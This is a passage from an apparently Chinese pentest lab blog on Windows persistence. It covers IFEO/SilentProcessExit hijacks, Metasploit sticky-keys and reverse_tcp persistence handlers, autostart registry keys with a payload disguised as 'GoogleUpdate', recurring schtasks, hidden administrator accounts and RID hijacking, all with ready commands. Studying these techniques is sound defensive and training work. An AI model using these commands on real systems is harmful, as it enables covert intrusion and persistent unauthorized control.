class="hljs-string">&quot;C:\Windows\system32\calc.exe&quot;</span> /f</span><br><br><span class="hljs-comment"># 可以更改C:\Windows\system32\calc.exe为payload，如powershell命令</span><br></code></pre></td></tr></table></figure>
+
+<p>我现在模拟运行cmd之后运行payload</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe&quot;</span> /v GlobalFlag /t REG_DWORD /d 512 /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\cmd.exe&quot;</span> /v ReportingMode /t REG_DWORD /d 1 /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\cmd.exe&quot;</span> /v MonitorProcess /t REG_SZ /d <span class="hljs-string">&quot;C:\w_x64_reverse_9999.exe&quot;</span> /f</span><br><br><span class="hljs-comment"># 可以更改C:\Windows\system32\calc.exe为payload，如powershell命令</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">MonitorProcess：表示监视器进程<br>ReportingMode：可以设置为以下三个值<br>0x1：LAUNCH<span class="hljs-emphasis">_MONITORPROCESS，检测到进程静默退出时，将会启动监视器进程，即</span><br><span class="hljs-emphasis">MonitorProcess 的项值</span><br><span class="hljs-emphasis">0x2：LOCAL_</span>DUMP，检测到进程静默退出时，将会为受监视的进程创建转储文件<br>0x3：NOTIFICATION，检查到进程静默退出时，将会弹出一个通知\<br></code></pre></td></tr></table></figure>
+
+<p>发现cmd不太行，但是我是用notepad 是可以的</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216111320006.png" srcset="/img/loading.gif" lazyload alt="image-20240216111320006"></p>
+<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><h3 id="sticky-keys"><a href="#sticky-keys" class="headerlink" title="sticky_keys"></a>sticky_keys</h3><blockquote>
+<p>Metasploit 框架提供了一个后渗透模块，可实现自动化地利用沾滞键的权限维持技术。  该模块将用 CMD 替换辅助功能的二进制文件（sethc, osk, disp, utilman）。  </p>
+</blockquote>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use post<span class="hljs-regexp">/windows/m</span>anage/sticky_keys<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216110351370.png" srcset="/img/loading.gif" lazyload alt="image-20240216110351370"></p>
+<p>TARGET  是粘滞键</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216110442127.png" srcset="/img/loading.gif" lazyload alt="image-20240216110442127"></p>
+<p>成功添加</p>
+<p>模拟访问</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216110602534.png" srcset="/img/loading.gif" lazyload alt="image-20240216110602534"></p>
+<p>连按5次 shift</p>
+<p>将Exe 换成我们指定的文件</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216110823503.png" srcset="/img/loading.gif" lazyload alt="image-20240216110823503"></p>
+<p>连续按5次shift 之后</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216110916975.png" srcset="/img/loading.gif" lazyload alt="image-20240216110916975"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216111034670.png" srcset="/img/loading.gif" lazyload alt="image-20240216111034670"></p>
+<p>system权限的</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216111214241.png" srcset="/img/loading.gif" lazyload alt="image-20240216111214241"></p>
+<p>查看Windows 之后发现这个被创建</p>
+<h1 id="msf-1"><a href="#msf-1" class="headerlink" title="msf"></a>msf</h1><h2 id="Persistence模块"><a href="#Persistence模块" class="headerlink" title="Persistence模块"></a>Persistence模块</h2><p>重启触发</p>
+<blockquote>
+<p>  exploit&#x2F;windows&#x2F;local&#x2F;persistence  </p>
+</blockquote>
+<blockquote>
+<p>Persistence 模块首先上传 vbs 脚本，然后执行vbs脚本修改注册表  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 或  HKLM\Software\Microsoft\Windows\CurrentVersion\Run从而完成自启动。  </p>
+</blockquote>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/local/persistence<br><span class="hljs-keyword">set</span> session <span class="hljs-comment">1</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">payload windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">DELAY     <span class="hljs-number">10</span>               yes       持久性有效载荷不断重新连接回来的延迟（秒）。<br>EXE_NAME                   <span class="hljs-keyword">no</span>        将在目标主机上使用的有效载荷的文件名（默认为%RAND%.exe）。<br><span class="hljs-type">PATH</span>                       <span class="hljs-keyword">no</span>        写入有效载荷的路径（默认为%<span class="hljs-keyword">TEMP</span>%）。<br>REG_NAME                   <span class="hljs-keyword">no</span>        在目标主机上调用注册表值进行持久化的名称（默认为%RAND%）。<br><span class="hljs-keyword">SESSION</span>   <span class="hljs-number">1</span>                yes       运行该模块的会话<br>STARTUP   <span class="hljs-keyword">USER</span>             yes       持久性有效载荷的启动类型。(接受：<span class="hljs-keyword">USER</span>, <span class="hljs-keyword">SYSTEM</span>)<br>VBS_NAME                   <span class="hljs-keyword">no</span>        目标主机上的VBS持久化脚本要使用的文件名（默认为%RAND%）。<br></code></pre></td></tr></table></figure>
+
+<p>这个模块的原理，使用可以子自运行的注册表项，然后自运行</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216113647895.png" srcset="/img/loading.gif" lazyload alt="image-20240216113647895"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216113806741.png" srcset="/img/loading.gif" lazyload alt="image-20240216113806741"></p>
+<p>发现擦创建了对应的payload</p>
+<p>查看注册表时发现是HKCU </p>
+<p>发现并没有在注册表里，但是这个是缩写，缩写原则是前一个单词的前两个字母，和后两个单词的首字母</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216114441656.png" srcset="/img/loading.gif" lazyload alt="image-20240216114441656"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216114845032.png" srcset="/img/loading.gif" lazyload alt="image-20240216114845032"></p>
+<h2 id="Autorunscript"><a href="#Autorunscript" class="headerlink" title="Autorunscript"></a>Autorunscript</h2><blockquote>
+<p>  获取shell的时候自动执行持续化脚本，可以被 Autorunscript 执行的命令目录在  metasploit&#x2F;scripts&#x2F;meterpreter。  </p>
+</blockquote>
+<ul>
+<li><p>persistence</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs diff">meterpreter &gt; run persistence -h<br><br><span class="hljs-deletion">-A：自动启动一个匹配的漏洞/多/处理程序来连接到代理</span><br><span class="hljs-deletion">-X：开机启动，注册表位置：</span><br>    HKLM\Software\Microsoft\Windows\CurrentVersion\Run<br><span class="hljs-deletion">-U：当前用户登录后自启动，注册表位置：</span><br>    HKCU\Software\Microsoft\Windows\CurrentVersion\Run<br><span class="hljs-deletion">-S：作为服务启动，注册表位置：</span><br>    HKLM\Software\Microsoft\Windows\CurrentVersion\Run<br><span class="hljs-deletion">-T：选择要使用的可执行模板</span><br><span class="hljs-deletion">-L：后门传到远程主机的位置默认为 %TEMP%</span><br><span class="hljs-deletion">-P：使用的Payload，默认windows/meterpreter/reverse_tcp，</span><br>    该默认的payload生成的后门为32位程序<br>    因此，当目标机器为64位系统时，留下的后门将无法运行<br><span class="hljs-deletion">-i：设置反向连接间隔时间，单位为秒</span><br><span class="hljs-deletion">-p：设置反向连接的端口号</span><br><span class="hljs-deletion">-r：设置反向连接的ip地址</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> PAYLOAD <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 192.168.78.117</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 5555</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">ExitOnSession false</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">AutoRunScript persistence -r 192.168.78.117 -p 5556 -U -X -i 30</span><br>exploit<br></code></pre></td></tr></table></figure>
+
+<p>在创建handler 的时候指定运行的脚本，意思就是说当执行有连接的时候，就会触发这个</p>
+</li>
+<li><p>migrate</p>
+</li>
+</ul>
+<p>  进程迁移操作</p>
+  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># migrate</span><br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.78.117<br><span class="hljs-built_in">set</span> LPORT 5555<br><span class="hljs-built_in">set</span> ExitOnSession <span class="hljs-literal">false</span><br><span class="hljs-built_in">set</span> AutoRunScript migrate -f<br>exploit<br></code></pre></td></tr></table></figure>
+
+<p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216122125942.png" srcset="/img/loading.gif" lazyload alt="image-20240216122125942"></p>
+<p>  尝试迁移到具体的进程名字</p>
+<p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216122620871.png" srcset="/img/loading.gif" lazyload alt="image-20240216122620871"></p>
+<p>  发现参数指定错了</p>
+<p>  使用-n</p>
+<p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216122852964.png" srcset="/img/loading.gif" lazyload alt="image-20240216122852964"></p>
+<p>  进程迁移的原理</p>
+<p>  先获取指定的进程的句柄，从而打开这个进程，然后申请一个内存用于执行shellcode 然后使用内存复制的函数，将原来的shellcode 执行，从而实现了内存注入</p>
+<p>  可以考虑为，使用ce 修改单机游戏的内存然后获取数值 上面的添加</p>
+<h1 id="开机自启动的注册表项"><a href="#开机自启动的注册表项" class="headerlink" title="开机自启动的注册表项"></a>开机自启动的注册表项</h1><p>使用这个方式的话，当受害者开机的话就会执行payload</p>
+<blockquote>
+<p>注册表的 HKEY_LOCAL_MACHINE 和 HKEY_CURRENT_USER 键的区别：前者对所有用户有效，后者只对当前用户有效</p>
+</blockquote>
+<h2 id="run"><a href="#run" class="headerlink" title="run"></a>run</h2><blockquote>
+<p>每一次系统启动时都是按照顺序自动的执行。是自动运行最常用用的键</p>
+</blockquote>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run<br></code></pre></td></tr></table></figure>
+
+<h2 id="RunServiceOnce"><a href="#RunServiceOnce" class="headerlink" title="RunServiceOnce"></a>RunServiceOnce</h2><blockquote>
+<p>用于启动服务，启动时间再用户登录之前，而且先于其他方式注册的自启动程序</p>
+</blockquote>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce<br></code></pre></td></tr></table></figure>
+
+<h2 id="RunOnceSetup"><a href="#RunOnceSetup" class="headerlink" title="RunOnceSetup"></a>RunOnceSetup</h2><blockquote>
+<p>指定了用户登录之后运行的程序</p>
+</blockquote>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceSetup<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceSetup<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="Load"><a href="#Load" class="headerlink" title="Load"></a>Load</h2><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这个感觉有一点奇怪</p>
+<p>建一个字符串名为load 的键值，为自启动程序的路径，需要注意短文间名规则</p>
+<p>如c:\Program Files 应该为c:\progra~1</p>
+</blockquote>
+<h2 id="Winlogon"><a href="#Winlogon" class="headerlink" title="Winlogon"></a>Winlogon</h2><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon<br></code></pre></td></tr></table></figure>
+
+<p>找到 Userinit 键值，默认为 C:\Windows\system32\userinit.exe, 后面加路径，再加逗号  也可以。也能够使系统启动时自动初始化程序。比如：userinit.exe,OSA.exe  </p>
+<p>注意下面的 Notify、Shell 键值也会有自启动的程序，而且其键值可以用逗号分隔，从而实现  </p>
+<p>登录的时候启动多个程序。</p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>使用生成的反弹shell的payload  </p>
+<p>在 meterpreter 下执行</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">upload /root/nc.exe C:<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>system32<br>reg enumkey -k HKLM<span class="hljs-symbol">\\</span>software<span class="hljs-symbol">\\</span>microsoft<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>currentversion<span class="hljs-symbol">\\</span>run<br>reg setval -k HKLM<span class="hljs-symbol">\\</span>software<span class="hljs-symbol">\\</span>microsoft<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>currentversion<span class="hljs-symbol">\\</span>run -v GoogleUpdate -d &#x27;C:\windows<span class="hljs-symbol">\t</span>emp\GoogleUpdate.exe&#x27;<br>reg queryval -k HKLM<span class="hljs-symbol">\\</span>software<span class="hljs-symbol">\\</span>microsoft<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>currentversion<span class="hljs-symbol">\\</span>Run -v GoogleUpdate<br>shutdown -r -f -t 0<br></code></pre></td></tr></table></figure>
+
+<p>在目标cmd 下执行  </p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">upload /root/nc.exe <span class="hljs-name">C</span>:\\windows\\system32<br>shell<br>reg query HKLM\software\microsoft\windows\currentversion\run<br>reg add HKLM\software\microsoft\windows\currentversion\run /v GoogleUpdate /t REG_SZ /d <span class="hljs-string">&quot;C:\windows\temp\GoogleUpdate.exe&quot;</span><br>reg query HKLM\software\microsoft\windows\currentversion\run /v GoogleUpdate<br>shutdown -r -f -t <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="Schtasks计划任务"><a href="#Schtasks计划任务" class="headerlink" title="Schtasks计划任务"></a>Schtasks计划任务</h1><p>这个方式很常用，可以定时执行我们指定的payload</p>
+<h2 id="Schtasks"><a href="#Schtasks" class="headerlink" title="Schtasks"></a>Schtasks</h2><blockquote>
+<p>  创建test定时任务，每分钟执行一次5555.exe  </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /sc MINUTE /mo 1 /tr C:\Users\Administrator\Desktop\6666.exe /tn <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure>
+
+<p>命令解析</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create<br><span class="hljs-comment"># 创建新的计划任务</span><br><br>/sc schedule<br><span class="hljs-comment"># 指定计划类型。有效值为 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。</span><br><br>/mo modifier<br><span class="hljs-comment"># 指定任务在其计划类型内的运行频率。这个参数对于 MONTHLY 计划是必需的。对于 MINUTE、HOURLY、DAILY 或 WEEKLY 计划，这个参数有效，但也可选。默认值为 1。</span><br><br>/tr &lt;TaskRun&gt;<br><span class="hljs-comment"># 指定任务运行的程序或命令。如果忽略该路径，SchTasks.exe 将假定文件在 %Systemroot%\System32 目录下。</span><br><br>/tn &lt;TaskName&gt;<br><span class="hljs-comment"># 指定任务的名称。</span><br></code></pre></td></tr></table></figure>
+
+<p>常用命令</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 每分钟执行一次任务</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/sc</span> MINUTE <span class="hljs-string">/mo</span> 1 <span class="hljs-string">/tn</span> calc_update <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;C:\windows\temp\5555.exe&quot;</span><br><br><span class="hljs-comment"># 每小时执行一次任务</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/sc</span> HOURLY <span class="hljs-string">/mo</span> 1 <span class="hljs-string">/tn</span> calc_update <span class="hljs-string">/tr</span>  <span class="hljs-string">&quot;C:\windows\temp\5555.exe&quot;</span><br><br><span class="hljs-comment"># 每天执行一次任务</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/sc</span> DAILY <span class="hljs-string">/mo</span> 1 <span class="hljs-string">/tn</span> calc_update <span class="hljs-string">/tr</span>  <span class="hljs-string">&quot;C:\windows\temp\5555.exe&quot;</span><br><br><span class="hljs-comment"># 每周执行一次任务</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/sc</span> WEEKLY <span class="hljs-string">/mo</span> 1 <span class="hljs-string">/tn</span> calc_update <span class="hljs-string">/tr</span>  <span class="hljs-string">&quot;C:\windows\temp\5555.exe&quot;</span><br><br><span class="hljs-comment"># 删除计划任务</span><br>schtasks <span class="hljs-string">/delete</span> <span class="hljs-string">/tn</span> calc_update <span class="hljs-string">/F</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>  schtasks命令详解： <a target="_blank" rel="noopener" href="https://www.cnblogs.com/visoeclipse/archive/2009/08/29/1556240.html">https://www.cnblogs.com/visoeclipse/archive/2009/08/29/1556240.html</a>  </p>
+</blockquote>
+<h2 id="schtasks-powershell"><a href="#schtasks-powershell" class="headerlink" title="schtasks+powershell"></a>schtasks+powershell</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Tt6REDrPH-WWgMB-mIOnTA">https://mp.weixin.qq.com/s/Tt6REDrPH-WWgMB-mIOnTA</a></p>
+<p>  利用PowerShell启动时执行Get-Variable执行恶意文件  </p>
+</blockquote>
+<ol>
+<li><p>将恶意程序放在 %APPDATA%\Local\Microsoft\WindowsApps 目录下并重命名为 Get-Variable.exe</p>
+</li>
+<li><p>创建计划任务实现持久化</p>
+</li>
+</ol>
+   <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">schtasks.exe<span class="hljs-symbol">&amp;nbsp;</span>/create<span class="hljs-symbol">&amp;nbsp;</span>/tn<span class="hljs-symbol">&amp;nbsp;</span>COMSurrogate<span class="hljs-symbol">&amp;nbsp;</span>/st<span class="hljs-symbol">&amp;nbsp;</span>00:00<span class="hljs-symbol">&amp;nbsp;</span>/du<span class="hljs-symbol">&amp;nbsp;</span>9999:59<span class="hljs-symbol">&amp;nbsp;</span>/sc<span class="hljs-symbol">&amp;nbsp;</span>once<span class="hljs-symbol">&amp;nbsp;</span>/ri<span class="hljs-symbol">&amp;nbsp;</span>1<span class="hljs-symbol">&amp;nbsp;</span>/f<span class="hljs-symbol">&amp;nbsp;</span>/tr<span class="hljs-symbol">&amp;nbsp;</span>&quot;powershell.exe<span class="hljs-symbol">&amp;nbsp;</span>-windowstyle<span class="hljs-symbol">&amp;nbsp;</span>hidden&quot;<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><p>该命令创建计划任务程序 COMSurrogate，该程序以隐藏的方式执行PowerShell。而执行  PowerShell 会启动恶意程序 GetVariable.exe，从而实现持久化。  </p>
+<p>原理：通过运行PowerShell时触发执行 Get-variable 来实现攻击</p>
+</li>
+</ol>
+<h1 id="账户隐藏"><a href="#账户隐藏" class="headerlink" title="账户隐藏"></a>账户隐藏</h1><p>就是创建一个隐藏用户，用户登录</p>
+<p>隐藏用户的话通过 net user 是发现不了的，只有在控制面版里面的管理账户界面可以看到</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> <span class="hljs-keyword">admin</span>$ AdminPassw0ad /<span class="hljs-keyword">add</span> &amp;&amp; net localgroup administrators <span class="hljs-keyword">admin</span>$ /<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure>
+
+<p>结尾使用<code>$</code>的意思就是隐藏用户</p>
+<p>激活Guest用户</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">guest</span> Admin@hacker &amp;&amp; net localgroup administrators guest /add<br>net <span class="hljs-keyword">user</span> <span class="hljs-title">guest</span> /active:yes<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="RID-劫持"><a href="#RID-劫持" class="headerlink" title="RID 劫持"></a>RID 劫持</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F">https://3gstudent.github.io/</a><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F">渗透技巧</a><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F">-Windows</a><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F">系统的帐户隐藏</a></p>
+</blockquote>
+<h2 id="RID"><a href="#RID" class="headerlink" title="RID"></a>RID</h2><blockquote>
+<p>  Relative Identifier 相对标识符  Windows系统账户对应固定的RID：  </p>
+</blockquote>
+<blockquote>
+<p>500:Administrator<br>501:Guest<br>502:krbtgt(域)<br>512:Domain Admins(域)<br>513:Domain Users(域)<br>514:Domain Guests(域)<br>515:Domain Computers(域)<br>516:Domain Controllers(域)</p>
+</blockquote>
+<h2 id="SID"><a href="#SID" class="headerlink" title="SID"></a>SID</h2><p>Security  Identifiers 安全标识符  </p>
+<blockquote>
+<p>安全标识符用于唯一标识安全主体或安全组。 安全主体可以表示可由操作系统进行身份验证的任何实  体，例如用户帐户、计算机帐户或在用户或计算机帐户的安全上下文中运行的线程或进程。  </p>
+</blockquote>
+<blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/understand-security-identifiers">https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/understand-security-</a>  <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/understand-security-identifiers">identiﬁers</a>  </p>
+</blockquote>
+<blockquote>
+<p>用户使用帐户名引用帐户，但是操作系统内部使用其安全标识符(SID)引用在帐户的安全上下文中运行  的帐户和进程。对于域帐户，通过将域的SD与该帐户的相对标识符(RID)串联来创建安全主体的SID。  SID在其范围内（域或本地）是唯一的，并且永不重用。  </p>
+</blockquote>
+<h2 id="RID-劫持-1"><a href="#RID-劫持-1" class="headerlink" title="RID 劫持"></a>RID 劫持</h2><blockquote>
+<p>通过覆写注册表数据，可以在被攻击设备上劫持任意用户的RID，并将其分配给另外一个用户  </p>
+<p>被劫持账户没有启用的情况，依旧可以达到劫持效果  </p>
+<p>被分配的用户拥有被劫持用户的权限  </p>
